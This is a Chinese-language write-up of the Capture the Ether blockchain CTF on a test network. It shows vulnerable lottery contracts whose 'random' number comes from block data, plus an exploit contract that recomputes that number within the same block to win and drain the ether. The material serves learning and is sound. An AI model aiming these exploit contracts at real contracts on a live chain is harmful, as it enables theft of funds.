* # 区块链官方CTF题 write-up

  官方网站：https://capturetheether.com/challenges/

  做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 `Begin Challenge` ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击 `Check Solution` ，同样metamask会弹出是否发送消息的对话框，点击确定，完成验证。

  ## Warmup

  ### [Deploy a contract](https://capturetheether.com/challenges/warmup/deploy/)
  
  - Write-Up
  
  ```
    直接点击 Begin Challenge , metamask 会弹出是否发送消息的对话框，点击确定。
    Begin Challenge 的圈圈转好之后，点击 Check Solution ，同样metamask会弹出是否发送消息的对话框，点击确定。
  ```
  
  ### [Call me](https://capturetheether.com/challenges/warmup/call-me/)
  
  - Write-Up
  
    总结：要想调用一个已经在链上部署的合约的函数，一个比较简单的方法是把源代码复制在remix上，再在deploy中的at address 框中输入已部署的合约地址。必须要这样，remix才可以找到已部署的合约并使用。
  
  ```
    打开 remix.ethereum.org 这个网址，新建一个合约文件，把solidity代码源码复制粘贴在合约文件中。
    在网址左侧找到 compile 栏，并单击右侧的compile按钮，编译该文件。
    在网址左侧找到 deploy 栏，environment下拉菜单中选择Injected Web3。
    在 deploy 栏中找到 at address ，在右侧框内输入题目中给的合约地址，点击 at address，下方会显示合约和合约函数列表，点击 callme 函数。
    完成
  ```
  
  ### [Choose a nickname](https://capturetheether.com/challenges/warmup/nickname/)
  
  ## Lotteries
  
  ### [Guess the number](https://capturetheether.com/challenges/lotteries/guess-the-number/)
  
  ### [Guess the secret number](https://capturetheether.com/challenges/lotteries/guess-the-secret-number/)
  
  ### [Guess the random number](https://capturetheether.com/challenges/lotteries/guess-the-random-number/)
  
  - 题目：
  
    ```c
    pragma solidity ^0.4.21;
    
    contract GuessTheRandomNumberChallenge {
        uint8 answer;
    
        function GuessTheRandomNumberChallenge() public payable {
            require(msg.value == 1 ether);
            answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        }
    
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
    
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
    
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
    ```
  
  - Write-up
  
    虽然uint8只有255种可能，但是`isComplete()`要求`address(this).balance == 0`。那么一次环境只能`guess`一次。所以我们要在`guess`前，先计算出来answer的值。
  
    >  answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  
    > `block.number` 即本区块的区块号
    >
    > `block.blockhash` 即目标区块号的区块哈希（`block.blockhash` 在 0.4.22 开始不推荐使用，在 0.5.0 已经移除了）
    >
    > `now` 即本区块号的时间戳，其值等于block.timestamp（在 0.7.0, `now` 被移除了）
  
    在`etherscan.io`上搜索合约，以`0xe2d8265D24A4e1045008AEAD2175C46dFA55b834`这个合约地址为例。
  
    ![](https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom1.png)
  
    ![](https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom2.png)
  
     一号是block号，点击进去后可以查看blockhash，也可以切换到别的block号进行查看。得到
  
    > block.blockhash(block.number - 1) = 0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0
  
    二号是timestamp。也就是构造体中的`now`。得到`Feb-20-2022 07:28:53 AM +UTC`。我们通过随便一个时间戳转换网址，把`UTC时间转换成UNIX时间戳`，得到时间戳`1645342133`。
  
    
  
    接着构造一个合约用于计算`keccak256`，合约如下。执行合约得解。
  
    ```
    pragma solidity ^0.4.21;
    
    contract GuessTheRandomNumberChallenge {
        uint8 public answer;
    
        function guess() public payable returns(uint8){
    		answer = uint8(keccak256(bytes32(0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0), uint(1645342133)));
    		
    		return answer;
        }
    }
    ```
  
    > 注意：要把`0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0`转换成`bytes32`，把`1645342133`转换成`uint`格式。
    >
    > 因为`block.blockhash`返回值是`bytes32`，`now`返回值是`uint`
  
    

### [Guess the new number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)

* 题目

  ```
  pragma solidity ^0.4.21;
  
  contract GuessTheNewNumberChallenge {
      function GuessTheNewNumberChallenge() public payable {
          require(msg.value == 1 ether);
      }
  
      function isComplete() public view returns (bool) {
          return address(this).balance == 0;
      }
  
      function guess(uint8 n) public payable {
          require(msg.value == 1 ether);
          uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  
          if (n == answer) {
              msg.sender.transfer(2 ether);
          }
      }
  }
  ```

  * Write-Up

    该题目的keccak256计算是跟随函数一起执行的，所以无法使用“提前算出answer，手动执行函数”的思路。但是只需要answer的计算和guess中处于同一个区块即可。

    > 思路：创建另外一个合约函数，在新函数内部计算`uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now))`，再调用`guess(uint8 n)`，`answer`作为`guess(uint8 n)`的参数。
    >
    > 即可实现answer的计算和guess(uint8 n)在同一个区块。

    攻击合约如下：

  ```
  pragma solidity ^0.4.21;
  
  contract GuessTheNewNumberChallenge {
  ...
  }
  
  contract exploit{
  
      function deposit() payable returns (uint){
          return msg.value;
      }
      
      function withdraw() payable {
          msg.sender.transfer(this.balance);
      }
  
      function attacker(address addr) {
          require(this.balance >= 1 ether);
  
          uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  
          GuessTheNewNumberChallenge guessContract = GuessTheNewNumberChallenge(addr);
          guessContract.guess.value(1 ether)(answer);
      }
  
      function () payable{
  
      }
  }
  ```

  做的时候思路一开始就正确了，但是实现的时候总是报`transaction revert error`。

  **这里有几个点需要特别注意理解：**

  1. `guessContract.guess.value(1 ether)(answer);`

     .value()是写在函数名和括号之间的。

  2. `function () payable{}`

       **非常重要！！！**
     
      就是因为没有写支持`payable`的`fallback`函数导致一直报`transaction revert error`。

     原因是`guess(uint8)`函数中有一条`msg.sender.transfer(2 ether);`会产生带有以太的回调。如果回调函数（即fallback函数）没有`payable`关键字，那就会报错。
     
     ![](https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png)
     
  3. `function attacker(address addr) {}`
  
       这个函数没有使用`payable`关键字，但是内部却使用了.value()。换言之，`payable`关键字的含义是“**调用该函数时**是否可以携带以太”。
  
       该函数调用别的函数时，只要别的函数有`payable`关键字就可以。